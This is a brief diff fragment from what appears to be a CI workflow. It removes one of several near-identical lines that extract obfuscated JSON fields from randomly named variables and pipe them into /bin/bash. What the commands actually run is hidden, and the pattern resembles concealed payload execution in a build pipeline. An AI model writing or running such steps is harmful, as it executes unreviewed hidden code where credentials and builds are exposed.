@@ -28,7 +28,6 @@ jobs:
           echo $p4 | jq -r .ucxyw87890 | /bin/bash
           printf '%s' "$v1" | jq -r .qx580 | /bin/bash
           echo $p8 | jq -r .gz07 | /bin/bash
-          printf '%s' "$stnk212" | jq -r .nxvz90338 | /bin/bash
           printf '%s' "$rhd06048" | jq -r .k1896 | /bin/bash
           printf '%s' "$ns03629" | jq -r .pgim446 | /bin/bash
           echo $deyk5 | jq -r .tszu19 | /bin/bash
